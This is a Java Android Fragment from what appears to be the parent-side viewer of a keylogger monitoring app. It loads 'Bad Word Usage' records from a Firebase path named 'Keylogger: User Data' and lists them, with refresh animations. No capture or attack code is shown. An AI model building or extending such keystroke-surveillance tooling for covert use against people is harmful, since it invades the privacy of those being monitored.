package com.maemresen.infsec.keyloggerParent;

import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.airbnb.lottie.LottieAnimationView;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;
import java.util.List;

public class CaughtUsingBadWordsFragment extends Fragment {
    private DatabaseReference allRecordsRef;
    private RecyclerView recyclerView;
    private BadWordsAdapter adapter;
    private List<String> textRecordsList;
    
    private LottieAnimationView loadingAnimationView,jumping_fish,waterBottom,waterTop;
    private boolean isLoading;
    private SwipeRefreshLayout swipeRefreshLayout;
    
    private static String ownerName = "";
    private static String selectedDate = "";
    
    @Nullable
    @Override
    public View onCreateView( @NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState ) {
        View rootView = inflater.inflate( R.layout.badwords_detection_layout, container, false );
    
        jumping_fish = rootView.findViewById( R.id.jumping_fish_badwords );
        recyclerView = rootView.findViewById( R.id.BadWordsRecycler );
        waterBottom = rootView.findViewById( R.id.waterBottom );
        waterTop = rootView.findViewById( R.id.waterTop );
        recyclerView.setLayoutManager( new LinearLayoutManager( getContext() ) );
        textRecordsList = new ArrayList<>();
        adapter = new BadWordsAdapter( textRecordsList );
        recyclerView.setAdapter( adapter );
        loadingAnimationView = rootView.findViewById( R.id.refreshBadWords );
        
        
        Bundle bundle = getArguments();
        if (bundle != null) {
            ownerName = bundle.getString( "OWNER_NAME" );
            selectedDate = bundle.getString( "SELECTED_DATE" );
        }
        
        UpdateFragment( ownerName, selectedDate );
        
        swipeRefreshLayout = rootView.findViewById( R.id.swipeBadWrods );
        swipeRefreshLayout.setOnRefreshListener( new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                // Perform the refresh operation
                if (ownerName != null || selectedDate != null) {
                    refreshData( ownerName, selectedDate );
                }
            }
        } );
        
        
        return rootView;
    }
    
    private void refreshData( String ownerName, String databaseName ) {
        isLoading = true;
    
        loadingAnimationView.setVisibility( View.VISIBLE );
        loadingAnimationView.playAnimation();
        recyclerView.setVisibility( View.GONE );
        waterBottom.setVisibility( View.VISIBLE );
        waterTop.setVisibility( View.VISIBLE );
        UpdateFragment( ownerName, databaseName );
        jumping_fish.setVisibility( View.GONE );
        
        // Simulate a delay before stopping the refresh animation
        new Handler().postDelayed( new Runnable() {
            @Override
            public void run() {
                swipeRefreshLayout.setRefreshing( false );
                loadingAnimationView.setVisibility( View.GONE );
                loadingAnimationView.cancelAnimation();
                jumping_fish.setVisibility( View.VISIBLE );
                recyclerView.setVisibility( View.VISIBLE );
                
            }
        }, 2500 ); // Delay for 2.5 seconds
    }
    
    
    public void UpdateFragment( String ownerName, String databaseName ) {
        
        allRecordsRef = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Bad Word Usage" );
        
        // Add a ValueEventListener to listen for changes in the data
        allRecordsRef.addValueEventListener( new ValueEventListener() {
            @Override
            public void onDataChange( @NonNull DataSnapshot dataSnapshot ) {
                textRecordsList.clear();
                
                for (DataSnapshot textRecordSnapshot : dataSnapshot.getChildren()) {
                    String textRecord = textRecordSnapshot.getValue( String.class );
                    textRecordsList.add( textRecord );
                }
                
                // Notify the adapter that the data has changed
                adapter.notifyDataSetChanged();
                
                isLoading = false;
                loadingAnimationView.setVisibility( View.GONE );
            }
            
            @Override
            public void onCancelled( @NonNull DatabaseError databaseError ) {
                // Handle errors that occur during data retrieval
                Log.e( "FirebaseError", "Data retrieval canceled: " + databaseError.getMessage() );
            }
            
        } );
    }
    
    @Override
    public void onResume() {
        super.onResume();
        
        UpdateFragment( ownerName, selectedDate );
        adapter.notifyDataSetChanged();
    }
}